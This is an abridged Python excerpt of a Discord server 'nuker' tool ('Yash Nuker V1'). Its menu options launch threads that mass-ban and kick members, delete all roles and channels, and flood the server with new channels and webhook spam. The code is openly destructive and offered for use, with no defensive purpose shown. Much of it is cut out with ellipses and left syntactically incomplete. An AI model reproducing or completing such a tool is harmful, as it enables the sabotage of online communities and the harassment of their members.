    ...
    def CreateChannel(guild):
        try:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                ...
                if spam == True:
                    webhook = Yash.CreateWebhook(r.json()['id'])
                    Thread(target=Yash.SendWebhook, args=(webhook,)).start()
            else:
...
async def menu():
    ...
    if choice == "1":
        ...
        while True:
            #try:
            Thread(target=Yash.Ban, args=(guild.id, members_1[num],)).start()
            Thread(target=Yash.Ban, args=(guild.id, members_2[num],)).start()
            Thread(target=Yash.Ban, args=(guild.id, members_3[num],)).start()
            num += 1
            #except IndexError:
                #break
            #except:
    ...
    if choice == "2":
        ...
        while True:
            try:
                Thread(target=Yash.Kick, args=(guild.id, members_11[num2],)).start()
                Thread(target=Yash.Kick, args=(guild.id, members_22[num2],)).start()
                Thread(target=Yash.Kick, args=(guild.id, members_33[num2],)).start()
                num2 += 1
            except IndexError:
                break
            except:
    ...
    if choice == "4":
        ...
        while True:
            try:
                Thread(target=Yash.DelRole, args=(guild.id, roles[rnum],)).start()
                rnum += 1
            except IndexError:
                break
            except:
    ...
    if choice == "5":
        ...
        while True:
            try:
                Thread(target=Yash.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
    ...
    if choice == "6":
        ...
        while True:
            try:
                Thread(target=Yash.Ban, args=(guild.id, members_111[num3],)).start()
                Thread(target=Yash.Ban, args=(guild.id, members_222[num3],)).start()
                Thread(target=Yash.Ban, args=(guild.id, members_333[num3],)).start()
                num3 += 1
            except IndexError:
                break
            except:
        ...
        for i in range(channel_amount):
            Thread(target=Yash.CreateChannel, args=(guild.id,)).start()
        ...
        for i in range(role_amount):
            Thread(target=Yash.CreateRole, args=(guild.id,)).start()
...
try:
    ...
    RPC.update(details="Main Menu", large_image="Yash", small_image="Yash", large_text="Yash Nuker V1", start=time.time())
except:
    pass
